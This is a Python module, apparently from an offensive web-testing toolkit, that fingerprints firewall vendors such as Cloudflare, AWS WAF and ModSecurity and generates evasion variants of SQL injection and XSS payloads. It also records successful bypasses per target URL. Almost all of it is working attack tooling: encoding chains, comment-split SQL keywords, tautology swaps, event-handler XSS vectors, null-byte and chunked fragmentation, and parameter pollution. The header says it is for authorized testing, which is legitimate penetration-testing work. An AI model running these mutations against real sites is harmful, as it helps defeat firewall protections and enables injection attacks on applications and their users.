"""
Advanced WAF Evasion Engine - Polymorphic Payload Generation & Adaptive Bypass.

This module provides a comprehensive WAF evasion toolkit with:
- Advanced polymorphic payload mutations
- WAF fingerprinting with confidence scoring
- Adaptive strategy selection based on WAF type
- Protocol-level evasion techniques
- Encoding chain mutations
- Context-aware payload generation
- Machine learning-ready bypass recording

IMPORTANT: This tool is designed for authorized security testing only.
All operations should be performed within the scope of a valid engagement.
"""

import re
import random
import urllib.parse
import base64
import html
import json
import hashlib
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from enum import Enum
from itertools import product


class WAFVendor(Enum):
    """Known WAF vendors with detection signatures."""
    CLOUDFLARE = "Cloudflare"
    AWS_WAF = "AWS WAF"
    AKAMAI = "Akamai"
    MODSECURITY = "ModSecurity"
    IMPERVA = "Imperva"
    F5_BIGIP = "F5 BIG-IP"
    FORTINET = "Fortinet"
    BARRACUDA = "Barracuda"
    CITRIX = "Citrix ADC"
    SUCURI = "Sucuri"
    WORDFENCE = "Wordfence"
    NGINX = "Nginx"
    AZURE_WAF = "Azure WAF"
    GOOGLE_CLOUD_ARMOR = "Google Cloud Armor"
    FASTLY = "Fastly"
    STACKPATH = "StackPath"
    UNKNOWN = "Unknown"


class EvasionStrategy(Enum):
    """Categories of evasion strategies."""
    ENCODING = "encoding"
    SYNTAX = "syntax"
    SEMANTIC = "semantic"
    PROTOCOL = "protocol"
    TIMING = "timing"
    FRAGMENTATION = "fragmentation"
    POLYMORPHIC = "polymorphic"


@dataclass
class MutationResult:
    """Result of a payload mutation operation."""
    payload: str
    strategy: str
    technique: str
    description: str
    category: EvasionStrategy
    confidence: float = 0.5  # Estimated bypass probability
    waf_specific: Optional[str] = None  # Specific WAF this targets
    encoding_chain: List[str] = field(default_factory=list)


@dataclass
class WAFFingerprint:
    """Detailed WAF fingerprint result."""
    vendor: WAFVendor
    confidence: float
    signatures_matched: List[str]
    headers_detected: Dict[str, str]
    behavior_indicators: List[str]
    recommended_strategies: List[EvasionStrategy]
    known_bypasses: List[str]


@dataclass
class EvasionContext:
    """Context for adaptive evasion."""
    target_url: str
    waf_vendor: Optional[WAFVendor] = None
    blocked_payloads: List[str] = field(default_factory=list)
    successful_payloads: List[str] = field(default_factory=list)
    blocked_techniques: List[str] = field(default_factory=list)
    successful_techniques: List[str] = field(default_factory=list)
    iteration: int = 0
    max_iterations: int = 50


class WAFEvasionEngine:
    """
    Advanced WAF Evasion Engine with adaptive strategies and polymorphic mutations.
    
    This engine provides comprehensive capabilities for WAF bypass testing:
    - Multi-layer encoding chains
    - WAF-specific evasion techniques
    - Adaptive strategy selection
    - Protocol-level manipulations
    - Context-aware payload generation
    """
    
    # Extended WAF signatures with confidence weights
    WAF_SIGNATURES: Dict[WAFVendor, Dict[str, List[Tuple[str, float]]]] = {
        WAFVendor.CLOUDFLARE: {
            "headers": [
                ("cf-ray", 1.0),
                ("cf-cache-status", 0.9),
                ("cf-request-id", 0.95),
                ("server: cloudflare", 1.0),
                ("__cfduid", 0.8),
                ("cf-connecting-ip", 0.7),
            ],
            "body": [
                ("Attention Required! | Cloudflare", 1.0),
                ("Error 1020", 0.95),
                ("Ray ID:", 0.9),
                ("cloudflare", 0.6),
                ("enable JavaScript and cookies", 0.7),
                ("checking your browser", 0.8),
            ],
            "cookies": [
                ("__cf_bm", 0.9),
                ("cf_clearance", 0.95),
            ],
        },
        WAFVendor.AWS_WAF: {
            "headers": [
                ("x-amzn-requestid", 0.8),
                ("x-amz-cf-id", 0.85),
                ("x-amzn-errortype", 0.95),
                ("AWSALB", 0.9),
                ("AWSALBCORS", 0.9),
                ("x-amz-apigw-id", 0.85),
            ],
            "body": [
                ("Request blocked", 0.7),
                ("AWS WAF", 0.95),
                ("waf", 0.3),
            ],
        },
        WAFVendor.AKAMAI: {
            "headers": [
                ("akamai", 0.9),
                ("akamai-grn", 0.95),
                ("x-akamai-transformed", 0.9),
                ("akamaighost", 0.85),
            ],
            "body": [
                ("Access Denied", 0.5),
                ("Reference #", 0.8),
                ("akamai", 0.6),
            ],
        },
        WAFVendor.MODSECURITY: {
            "headers": [
                ("server: apache", 0.3),
                ("mod_security", 0.95),
                ("modsecurity", 0.95),
            ],
            "body": [
                ("ModSecurity", 0.95),
                ("406 Not Acceptable", 0.7),
                ("This error was generated by Mod_Security", 0.95),
                ("Not Acceptable", 0.5),
                ("NOYB", 0.8),
            ],
        },
        WAFVendor.IMPERVA: {
            "headers": [
                ("x-iinfo", 0.9),
                ("x-cdn", 0.5),
            ],
            "cookies": [
                ("incap_ses", 0.95),
                ("visid_incap", 0.95),
                ("nlbi_", 0.9),
            ],
            "body": [
                ("incapsula", 0.95),
                ("incident", 0.4),
                ("Request unsuccessful", 0.6),
            ],
        },
        WAFVendor.F5_BIGIP: {
            "headers": [
                ("x-wa-info", 0.8),
                ("bigipserver", 0.95),
            ],
            "cookies": [
                ("TS", 0.7),
                ("BIGipServer", 0.95),
                ("F5", 0.8),
            ],
            "body": [
                ("The requested URL was rejected", 0.85),
                ("BIG-IP", 0.9),
            ],
        },
        WAFVendor.FORTINET: {
            "headers": [
                ("fortiwafsid", 0.95),
            ],
            "cookies": [
                ("FORTIWAFSID", 0.95),
            ],
            "body": [
                ("fortigate", 0.9),
                ("fortiweb", 0.95),
                ("FortiGuard", 0.9),
            ],
        },
        WAFVendor.SUCURI: {
            "headers": [
                ("x-sucuri-id", 0.95),
                ("x-sucuri-cache", 0.9),
                ("server: sucuri", 0.95),
            ],
            "body": [
                ("sucuri", 0.9),
                ("cloudproxy", 0.85),
                ("Access Denied - Sucuri", 0.95),
            ],
        },
        WAFVendor.AZURE_WAF: {
            "headers": [
                ("x-azure-ref", 0.9),
                ("x-ms-request-id", 0.7),
            ],
            "body": [
                ("azure", 0.5),
                ("Microsoft-Azure-Application-Gateway", 0.95),
            ],
        },
        WAFVendor.GOOGLE_CLOUD_ARMOR: {
            "body": [
                ("google", 0.3),
                ("Cloud Armor", 0.95),
            ],
        },
    }
    
    # WAF-specific bypass techniques
    WAF_BYPASS_TECHNIQUES: Dict[WAFVendor, List[str]] = {
        WAFVendor.CLOUDFLARE: [
            "unicode_normalization",
            "chunked_encoding",
            "null_byte_injection",
            "parameter_pollution",
            "case_switching",
            "origin_header_bypass",
        ],
        WAFVendor.AWS_WAF: [
            "content_type_manipulation",
            "json_smuggling",
            "multipart_boundary",
            "header_injection",
        ],
        WAFVendor.MODSECURITY: [
            "inline_comments",
            "function_aliasing",
            "scientific_notation",
            "charset_encoding",
        ],
        WAFVendor.IMPERVA: [
            "double_encoding",
            "unicode_abuse",
            "protocol_smuggling",
        ],
    }
    
    # Encoding functions
    ENCODERS: Dict[str, Callable[[str], str]] = {}
    
    def __init__(self):
        """Initialize the WAF Evasion Engine."""
        self._init_encoders()
        self._mutation_cache: Dict[str, List[MutationResult]] = {}
        self._bypass_history: List[Dict[str, Any]] = []
    
    def _init_encoders(self) -> None:
        """Initialize encoding functions."""
        self.ENCODERS = {
            "url": lambda s: urllib.parse.quote(s, safe=''),
            "url_double": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''),
            "url_unicode": self._url_unicode_encode,
            "html_entity": lambda s: html.escape(s),
            "html_entity_decimal": self._html_decimal_encode,
            "html_entity_hex": self._html_hex_encode,
            "base64": lambda s: base64.b64encode(s.encode()).decode(),
            "hex": lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
            "hex_css": lambda s: ''.join(f'\\{ord(c):02x}' for c in s),
            "unicode_escape": lambda s: s.encode('unicode_escape').decode(),
            "unicode_full": self._unicode_full_encode,
            "octal": lambda s: ''.join(f'\\{ord(c):03o}' for c in s),
            "binary": lambda s: ' '.join(f'{ord(c):08b}' for c in s),
        }
    
    @staticmethod
    def _url_unicode_encode(s: str) -> str:
        """URL encode using Unicode escapes."""
        return ''.join(f'%u{ord(c):04x}' for c in s)
    
    @staticmethod
    def _html_decimal_encode(s: str) -> str:
        """HTML encode using decimal entities."""
        return ''.join(f'&#{ord(c)};' for c in s)
    
    @staticmethod
    def _html_hex_encode(s: str) -> str:
        """HTML encode using hex entities."""
        return ''.join(f'&#x{ord(c):x};' for c in s)
    
    @staticmethod
    def _unicode_full_encode(s: str) -> str:
        """Full Unicode encoding with varying formats."""
        result = []
        for c in s:
            code = ord(c)
            if random.random() > 0.5:
                result.append(f'\\u{code:04x}')
            else:
                result.append(f'\\u00{code:02x}')
        return ''.join(result)
    
    def fingerprint_waf(
        self,
        headers: Dict[str, str],
        body: str,
        status_code: int,
        cookies: Optional[Dict[str, str]] = None,
    ) -> WAFFingerprint:
        """
        Advanced WAF fingerprinting with confidence scoring.
        
        Analyzes response artifacts to identify the WAF vendor with
        confidence scoring and recommended bypass strategies.
        """
        cookies = cookies or {}
        best_match: Optional[WAFVendor] = None
        best_confidence = 0.0
        all_signatures: List[str] = []
        detected_headers: Dict[str, str] = {}
        behavior_indicators: List[str] = []
        
        # Normalize for case-insensitive matching
        headers_lower = {k.lower(): v for k, v in headers.items()}
        body_lower = body.lower()
        cookies_lower = {k.lower(): v for k, v in cookies.items()}
        
        for waf_vendor, signatures in self.WAF_SIGNATURES.items():
            vendor_confidence = 0.0
            vendor_matches = []
            
            # Check headers
            for sig, weight in signatures.get("headers", []):
                sig_lower = sig.lower()
                for h_name, h_value in headers_lower.items():
                    h_combined = f"{h_name}: {h_value}".lower()
                    if sig_lower in h_combined:
                        vendor_confidence += weight
                        vendor_matches.append(f"header:{sig}")
                        detected_headers[h_name] = h_value
            
            # Check body
            for sig, weight in signatures.get("body", []):
                if sig.lower() in body_lower:
                    vendor_confidence += weight
                    vendor_matches.append(f"body:{sig}")
            
            # Check cookies
            for sig, weight in signatures.get("cookies", []):
                sig_lower = sig.lower()
                for c_name in cookies_lower:
                    if sig_lower in c_name:
                        vendor_confidence += weight
                        vendor_matches.append(f"cookie:{sig}")
            
            # Normalize confidence
            max_possible = sum(
                w for sigs in signatures.values() for _, w in sigs
            )
            if max_possible > 0:
                normalized_confidence = min(1.0, vendor_confidence / max_possible)
            else:
                normalized_confidence = 0.0
            
            if normalized_confidence > best_confidence:
                best_confidence = normalized_confidence
                best_match = waf_vendor
                all_signatures = vendor_matches
        
        # Add behavior indicators
        if status_code == 403:
            behavior_indicators.append("403_forbidden_response")
        if status_code == 406:
            behavior_indicators.append("406_not_acceptable")
        if status_code == 429:
            behavior_indicators.append("rate_limiting_detected")
        if "captcha" in body_lower or "challenge" in body_lower:
            behavior_indicators.append("challenge_page_detected")
        if "blocked" in body_lower:
            behavior_indicators.append("explicit_block_message")
        
        # Determine recommended strategies
        recommended = self._get_recommended_strategies(best_match, behavior_indicators)
        
        # Get known bypasses
        known_bypasses = self.WAF_BYPASS_TECHNIQUES.get(best_match, []) if best_match else []
        
        return WAFFingerprint(
            vendor=best_match or WAFVendor.UNKNOWN,
            confidence=best_confidence,
            signatures_matched=all_signatures,
            headers_detected=detected_headers,
            behavior_indicators=behavior_indicators,
            recommended_strategies=recommended,
            known_bypasses=known_bypasses,
        )
    
    def _get_recommended_strategies(
        self,
        waf_vendor: Optional[WAFVendor],
        indicators: List[str],
    ) -> List[EvasionStrategy]:
        """Get recommended evasion strategies based on WAF and behavior."""
        strategies = []
        
        # Universal strategies
        strategies.extend([
            EvasionStrategy.ENCODING,
            EvasionStrategy.SYNTAX,
        ])
        
        # WAF-specific recommendations
        if waf_vendor == WAFVendor.CLOUDFLARE:
            strategies.extend([
                EvasionStrategy.PROTOCOL,
                EvasionStrategy.FRAGMENTATION,
            ])
        elif waf_vendor == WAFVendor.MODSECURITY:
            strategies.extend([
                EvasionStrategy.SEMANTIC,
                EvasionStrategy.POLYMORPHIC,
            ])
        elif waf_vendor in [WAFVendor.AWS_WAF, WAFVendor.AZURE_WAF]:
            strategies.extend([
                EvasionStrategy.ENCODING,
                EvasionStrategy.PROTOCOL,
            ])
        
        # Behavior-based recommendations
        if "rate_limiting_detected" in indicators:
            strategies.append(EvasionStrategy.TIMING)
        if "challenge_page_detected" in indicators:
            strategies.append(EvasionStrategy.PROTOCOL)
        
        return list(set(strategies))
    
    def detect_waf(
        self,
        headers: Dict[str, str],
        body: str,
        status_code: int,
    ) -> Optional[str]:
        """
        Quick WAF detection for backward compatibility.
        Returns WAF vendor name or None.
        """
        fp = self.fingerprint_waf(headers, body, status_code)
        return fp.vendor.value if fp.vendor != WAFVendor.UNKNOWN else None
    
    def generate_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext] = None,
        strategies: Optional[List[EvasionStrategy]] = None,
        max_mutations: int = 50,
    ) -> List[MutationResult]:
        """
        Generate comprehensive payload mutations.
        
        Produces a diverse set of mutations using multiple strategies,
        prioritized based on WAF type and previous results.
        """
        # Check cache
        cache_key = hashlib.md5(f"{payload}_{context}_{strategies}".encode()).hexdigest()
        if cache_key in self._mutation_cache:
            return self._mutation_cache[cache_key][:max_mutations]
        
        mutations: List[MutationResult] = []
        strategies = strategies or list(EvasionStrategy)
        
        # Generate mutations for each strategy
        if EvasionStrategy.ENCODING in strategies:
            mutations.extend(self._generate_encoding_mutations(payload, context))
        
        if EvasionStrategy.SYNTAX in strategies:
            mutations.extend(self._generate_syntax_mutations(payload, context))
        
        if EvasionStrategy.SEMANTIC in strategies:
            mutations.extend(self._generate_semantic_mutations(payload, context))
        
        if EvasionStrategy.PROTOCOL in strategies:
            mutations.extend(self._generate_protocol_mutations(payload, context))
        
        if EvasionStrategy.POLYMORPHIC in strategies:
            mutations.extend(self._generate_polymorphic_mutations(payload, context))
        
        if EvasionStrategy.FRAGMENTATION in strategies:
            mutations.extend(self._generate_fragmentation_mutations(payload, context))
        
        # Filter out blocked techniques if context provided
        if context:
            mutations = [
                m for m in mutations
                if m.technique not in context.blocked_techniques
            ]
            
            # Boost confidence for successful techniques
            for m in mutations:
                if m.technique in context.successful_techniques:
                    m.confidence = min(1.0, m.confidence + 0.2)
        
        # Sort by confidence
        mutations.sort(key=lambda x: -x.confidence)
        
        # Cache and return
        self._mutation_cache[cache_key] = mutations
        return mutations[:max_mutations]
    
    def _generate_encoding_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate encoding-based mutations."""
        mutations = []
        
        # Single encodings
        for enc_name, encoder in self.ENCODERS.items():
            try:
                encoded = encoder(payload)
                mutations.append(MutationResult(
                    payload=encoded,
                    strategy="encoding",
                    technique=f"single_{enc_name}",
                    description=f"Single {enc_name} encoding",
                    category=EvasionStrategy.ENCODING,
                    confidence=0.4,
                    encoding_chain=[enc_name],
                ))
            except Exception:
                continue
        
        # Double/chain encodings
        encoding_chains = [
            ["url", "url"],
            ["url", "base64"],
            ["html_entity", "url"],
            ["unicode_escape", "url"],
            ["hex", "url"],
        ]
        
        for chain in encoding_chains:
            try:
                result = payload
                for enc in chain:
                    result = self.ENCODERS[enc](result)
                mutations.append(MutationResult(
                    payload=result,
                    strategy="encoding_chain",
                    technique=f"chain_{'_'.join(chain)}",
                    description=f"Encoding chain: {' -> '.join(chain)}",
                    category=EvasionStrategy.ENCODING,
                    confidence=0.5,
                    encoding_chain=chain,
                ))
            except Exception:
                continue
        
        # Partial encoding (encode only keywords)
        keywords = ["SELECT", "UNION", "script", "alert", "eval", "onerror", "onclick"]
        for kw in keywords:
            if kw.lower() in payload.lower():
                for enc_name in ["url", "html_entity_hex", "unicode_escape"]:
                    encoded_kw = self.ENCODERS[enc_name](kw)
                    partial = re.sub(
                        re.escape(kw),
                        encoded_kw,
                        payload,
                        flags=re.IGNORECASE
                    )
                    if partial != payload:
                        mutations.append(MutationResult(
                            payload=partial,
                            strategy="partial_encoding",
                            technique=f"partial_{enc_name}_{kw}",
                            description=f"Partial {enc_name} encoding of '{kw}'",
                            category=EvasionStrategy.ENCODING,
                            confidence=0.55,
                            encoding_chain=[f"partial_{enc_name}"],
                        ))
        
        return mutations
    
    def _generate_syntax_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate syntax-based mutations."""
        mutations = []
        
        # SQL mutations
        sql_mutations = [
            # Inline comments
            (r'\s+', '/**/', "sql_inline_comment", "Replace spaces with inline comments"),
            (r'\s+', '/**//**/', "sql_nested_comment", "Nested inline comments"),
            (r'\s+', '/*! */', "sql_mysql_comment", "MySQL version comment"),
            # Whitespace alternatives
            (r'\s+', '\t', "sql_tab_whitespace", "Replace spaces with tabs"),
            (r'\s+', '\n', "sql_newline_whitespace", "Replace spaces with newlines"),
            (r'\s+', '\r\n', "sql_crlf_whitespace", "Replace spaces with CRLF"),
            (r'\s+', '%09', "sql_encoded_tab", "URL-encoded tab"),
            (r'\s+', '%0a', "sql_encoded_newline", "URL-encoded newline"),
            (r'\s+', '%0d%0a', "sql_encoded_crlf", "URL-encoded CRLF"),
            (r'\s+', '%00', "sql_null_byte", "Null byte space replacement"),
        ]
        
        for pattern, replacement, technique, desc in sql_mutations:
            mutated = re.sub(pattern, replacement, payload)
            if mutated != payload:
                mutations.append(MutationResult(
                    payload=mutated,
                    strategy="syntax",
                    technique=technique,
                    description=desc,
                    category=EvasionStrategy.SYNTAX,
                    confidence=0.5,
                ))
        
        # Case mutations
        case_mutations = [
            (self._alternate_case, "alternate_case", "AlTeRnAtInG CaSe"),
            (self._random_case, "random_case", "Random case mixing"),
            (str.upper, "all_upper", "ALL UPPERCASE"),
            (str.lower, "all_lower", "all lowercase"),
        ]
        
        for func, technique, desc in case_mutations:
            mutated = func(payload)
            if mutated != payload:
                mutations.append(MutationResult(
                    payload=mutated,
                    strategy="case_mutation",
                    technique=technique,
                    description=desc,
                    category=EvasionStrategy.SYNTAX,
                    confidence=0.45,
                ))
        
        # XSS tag mutations
        xss_mutations = [
            ("<script>", "<ScRiPt>", "xss_mixed_case_script"),
            ("<script>", "<script/", "xss_self_closing_script"),
            ("<script>", "<script\t>", "xss_tab_in_tag"),
            ("<script>", "<script\n>", "xss_newline_in_tag"),
            ("<script>", "<scr\x00ipt>", "xss_null_byte_script"),
            ("<img", "<IMG", "xss_upper_img"),
            ("<svg", "<SVG", "xss_upper_svg"),
            ("onerror=", "onerror =", "xss_space_before_equals"),
            ("onerror=", "onerror\t=", "xss_tab_before_equals"),
            ("javascript:", "java\tscript:", "xss_tab_in_proto"),
            ("javascript:", "java\nscript:", "xss_newline_in_proto"),
            ("javascript:", "java&#x09;script:", "xss_entity_tab_proto"),
        ]
        
        for old, new, technique in xss_mutations:
            if old in payload.lower():
                mutated = re.sub(re.escape(old), new, payload, flags=re.IGNORECASE)
                mutations.append(MutationResult(
                    payload=mutated,
                    strategy="xss_syntax",
                    technique=technique,
                    description=f"XSS syntax mutation: {old} -> {new}",
                    category=EvasionStrategy.SYNTAX,
                    confidence=0.5,
                ))
        
        return mutations
    
    def _generate_semantic_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate semantic-equivalent mutations."""
        mutations = []
        
        # SQL keyword alternatives
        sql_alternatives = {
            "UNION": ["UNION ALL", "/*!UNION*/", "UN/**/ION"],
            "SELECT": ["/*!SELECT*/", "SEL/**/ECT", "SELECT/**/"],
            "FROM": ["/*!FROM*/", "FR/**/OM"],
            "WHERE": ["/*!WHERE*/", "WH/**/ERE"],
            "AND": ["&&", "AND/**/", "/*!AND*/"],
            "OR": ["||", "OR/**/", "/*!OR*/"],
            "=": ["LIKE", "REGEXP", "RLIKE"],
            " ": ["/**/", "%20", "+", "%09", "%0a"],
            "'": ["\"", "`", "\\\\x27", "%27"],
            "1=1": ["1<2", "1!=2", "1 LIKE 1", "'a'='a'", "2>1"],
            "admin": ["ADMIN", "Admin", "ad'+'min", "adm'||'in"],
        }
        
        for old, alternatives in sql_alternatives.items():
            if old.lower() in payload.lower():
                for alt in alternatives:
                    mutated = re.sub(
                        re.escape(old),
                        alt,
                        payload,
                        flags=re.IGNORECASE
                    )
                    if mutated != payload:
                        mutations.append(MutationResult(
                            payload=mutated,
                            strategy="semantic",
                            technique=f"sql_alt_{old.replace(' ', '_')}_{alt[:10]}",
                            description=f"SQL semantic: {old} -> {alt}",
                            category=EvasionStrategy.SEMANTIC,
                            confidence=0.55,
                        ))
        
        # XSS semantic alternatives
        xss_alternatives = {
            "alert": ["prompt", "confirm", "console.log", "eval", "Function"],
            "<script>": [
                "<img src=x onerror=",
                "<svg onload=",
                "<body onload=",
                "<iframe onload=",
                "<input onfocus=autofocus ",
                "<marquee onstart=",
                "<details ontoggle=",
                "<video onerror=",
                "<audio onerror=",
            ],
            "onerror": ["onload", "onfocus", "onmouseover", "onclick", "onanimationend"],
            "javascript:": ["data:text/html,", "vbscript:", "livescript:"],
        }
        
        for old, alternatives in xss_alternatives.items():
            if old.lower() in payload.lower():
                for alt in alternatives:
                    mutated = re.sub(
                        re.escape(old),
                        alt,
                        payload,
                        flags=re.IGNORECASE,
                        count=1
                    )
                    if mutated != payload:
                        mutations.append(MutationResult(
                            payload=mutated,
                            strategy="xss_semantic",
                            technique=f"xss_alt_{old[:10]}",
                            description=f"XSS semantic: {old} -> {alt}",
                            category=EvasionStrategy.SEMANTIC,
                            confidence=0.5,
                        ))
        
        # String concatenation tricks
        concat_tricks = [
            ("alert", "al'+'ert", "js_concat_plus"),
            ("alert", "al\"+\"ert", "js_concat_double"),
            ("alert", "al`.concat(`ert", "js_concat_template"),
            ("eval", "ev'+'al", "js_eval_concat"),
        ]
        
        for old, new, technique in concat_tricks:
            if old in payload.lower():
                mutated = re.sub(re.escape(old), new, payload, flags=re.IGNORECASE)
                mutations.append(MutationResult(
                    payload=mutated,
                    strategy="concat_trick",
                    technique=technique,
                    description=f"String concatenation: {old} -> {new}",
                    category=EvasionStrategy.SEMANTIC,
                    confidence=0.45,
                ))
        
        return mutations
    
    def _generate_protocol_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate protocol-level mutations."""
        mutations = []
        
        # HTTP Parameter Pollution variations
        hpp_mutations = [
            f"{payload}&{payload}",
            f"dummy=1&actual={payload}",
            f"{payload}%00",
            f"{payload}%0a%0d",
        ]
        
        for i, mutated in enumerate(hpp_mutations):
            mutations.append(MutationResult(
                payload=mutated,
                strategy="protocol",
                technique=f"hpp_variant_{i}",
                description=f"HTTP Parameter Pollution variant {i}",
                category=EvasionStrategy.PROTOCOL,
                confidence=0.4,
            ))
        
        # Content-Type specific mutations
        json_payload = json.dumps({"value": payload})
        mutations.append(MutationResult(
            payload=json_payload,
            strategy="protocol",
            technique="json_wrap",
            description="Wrap payload in JSON structure",
            category=EvasionStrategy.PROTOCOL,
            confidence=0.45,
        ))
        
        # Multipart boundary tricks
        multipart_payload = f"""--boundary\r
Content-Disposition: form-data; name="param"\r
\r
{payload}\r
--boundary--"""
        mutations.append(MutationResult(
            payload=multipart_payload,
            strategy="protocol",
            technique="multipart_wrap",
            description="Wrap in multipart form-data",
            category=EvasionStrategy.PROTOCOL,
            confidence=0.4,
        ))
        
        return mutations
    
    def _generate_polymorphic_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate polymorphic mutations combining multiple techniques."""
        mutations = []
        
        # Combine encoding + syntax
        base_mutations = self._generate_encoding_mutations(payload, context)[:5]
        syntax_mutations = self._generate_syntax_mutations(payload, context)[:5]
        
        # Create combinations
        for enc_mut in base_mutations:
            for syn_mut in syntax_mutations:
                # Apply syntax mutation to encoded payload
                try:
                    combined = re.sub(r'\s+', '/**/', enc_mut.payload)
                    mutations.append(MutationResult(
                        payload=combined,
                        strategy="polymorphic",
                        technique=f"poly_{enc_mut.technique}_{syn_mut.technique}",
                        description=f"Combined: {enc_mut.technique} + comment injection",
                        category=EvasionStrategy.POLYMORPHIC,
                        confidence=min(0.7, enc_mut.confidence + syn_mut.confidence),
                        encoding_chain=enc_mut.encoding_chain + [syn_mut.technique],
                    ))
                except Exception:
                    continue
        
        # Add randomized mutations
        for i in range(5):
            randomized = self._apply_random_mutations(payload)
            mutations.append(MutationResult(
                payload=randomized,
                strategy="polymorphic",
                technique=f"random_poly_{i}",
                description=f"Randomized polymorphic mutation #{i}",
                category=EvasionStrategy.POLYMORPHIC,
                confidence=0.35,
            ))
        
        return mutations
    
    def _generate_fragmentation_mutations(
        self,
        payload: str,
        context: Optional[EvasionContext],
    ) -> List[MutationResult]:
        """Generate fragmentation-based mutations."""
        mutations = []
        
        # Character-level fragmentation
        if len(payload) > 5:
            # Insert null bytes
            fragmented = ''.join(c + '\x00' for c in payload)
            mutations.append(MutationResult(
                payload=fragmented,
                strategy="fragmentation",
                technique="null_byte_interleave",
                description="Interleave null bytes between characters",
                category=EvasionStrategy.FRAGMENTATION,
                confidence=0.35,
            ))
            
            # Insert comments (for SQL)
            fragmented_sql = '/**/'.join(payload)
            mutations.append(MutationResult(
                payload=fragmented_sql,
                strategy="fragmentation",
                technique="comment_interleave",
                description="Interleave SQL comments between characters",
                category=EvasionStrategy.FRAGMENTATION,
                confidence=0.4,
            ))
        
        # Chunked encoding simulation
        chunk_size = max(1, len(payload) // 3)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        chunked = '\r\n'.join(f"{len(c):x}\r\n{c}" for c in chunks) + "\r\n0\r\n\r\n"
        mutations.append(MutationResult(
            payload=chunked,
            strategy="fragmentation",
            technique="chunked_encoding",
            description="Chunked transfer encoding format",
            category=EvasionStrategy.FRAGMENTATION,
            confidence=0.4,
        ))
        
        return mutations
    
    def _apply_random_mutations(self, payload: str) -> str:
        """Apply random mutations to a payload."""
        result = payload
        
        mutations_to_apply = random.randint(2, 4)
        mutation_funcs = [
            lambda s: re.sub(r'\s+', random.choice(['/**/', '%20', '\t', '%09']), s),
            lambda s: ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in s
            ),
            lambda s: urllib.parse.quote(s, safe=random.choice(['', '/', ' ', '&'])),
            lambda s: s.replace("'", random.choice(["\\'", "''", "%27"])),
        ]
        
        for _ in range(mutations_to_apply):
            func = random.choice(mutation_funcs)
            try:
                result = func(result)
            except Exception:
                pass
        
        return result
    
    @staticmethod
    def _alternate_case(s: str) -> str:
        """Convert string to alternating case."""
        return ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(s)
        )
    
    @staticmethod
    def _random_case(s: str) -> str:
        """Convert string to random case."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in s
        )
    
    # Backward compatibility methods
    def generate_heuristic_mutations(self, payload: str) -> List[MutationResult]:
        """Generate heuristic mutations (backward compatibility)."""
        return self.generate_mutations(payload, max_mutations=20)
    
    @staticmethod
    def _mutate_sql_encoding(payload: str) -> str:
        """URL encode (backward compatibility)."""
        return urllib.parse.quote(payload)
    
    @staticmethod
    def _mutate_sql_comments(payload: str) -> str:
        """Inline comments (backward compatibility)."""
        return payload.replace(" ", "/**/")
    
    @staticmethod
    def _mutate_sql_case(payload: str) -> str:
        """Mixed case (backward compatibility)."""
        return WAFEvasionEngine._alternate_case(payload)
    
    @staticmethod
    def _mutate_sql_whitespace(payload: str) -> str:
        """Tab whitespace (backward compatibility)."""
        return payload.replace(" ", "\t")
    
    @staticmethod
    def _mutate_xss_script_tag(payload: str) -> str:
        """Script tag replacement (backward compatibility)."""
        if "<script>" in payload:
            return payload.replace("<script>", "<img src=x onerror=")
        return payload
    
    @staticmethod
    def _mutate_xss_unicode(payload: str) -> str:
        """Unicode escape (backward compatibility)."""
        return payload.replace("alert", "\\u0061lert").replace("prompt", "\\u0070rompt")
    
    def record_bypass(
        self,
        original_payload: str,
        successful_payload: str,
        waf_vendor: WAFVendor,
        technique: str,
        target_url: str,
    ) -> None:
        """Record a successful WAF bypass for learning."""
        self._bypass_history.append({
            "original": original_payload,
            "successful": successful_payload,
            "waf_vendor": waf_vendor.value,
            "technique": technique,
            "target_url": target_url,
            "timestamp": datetime.now().isoformat() if 'datetime' in dir() else None,
        })
    
    def get_bypass_history(
        self,
        waf_vendor: Optional[WAFVendor] = None,
    ) -> List[Dict[str, Any]]:
        """Get recorded bypass history, optionally filtered by WAF."""
        if waf_vendor is None:
            return self._bypass_history
        return [
            b for b in self._bypass_history
            if b["waf_vendor"] == waf_vendor.value
        ]
    
    def get_recommended_mutations(
        self,
        payload: str,
        waf_fingerprint: WAFFingerprint,
        max_mutations: int = 10,
    ) -> List[MutationResult]:
        """Get mutations recommended specifically for the detected WAF."""
        mutations = self.generate_mutations(
            payload,
            strategies=waf_fingerprint.recommended_strategies,
            max_mutations=max_mutations * 2,
        )
        
        # Boost mutations that use known bypass techniques
        for mutation in mutations:
            if mutation.technique in waf_fingerprint.known_bypasses:
                mutation.confidence = min(1.0, mutation.confidence + 0.3)
                mutation.waf_specific = waf_fingerprint.vendor.value
        
        # Sort by confidence and return top mutations
        mutations.sort(key=lambda x: -x.confidence)
        return mutations[:max_mutations]


# Import datetime for the record_bypass function
from datetime import datetime
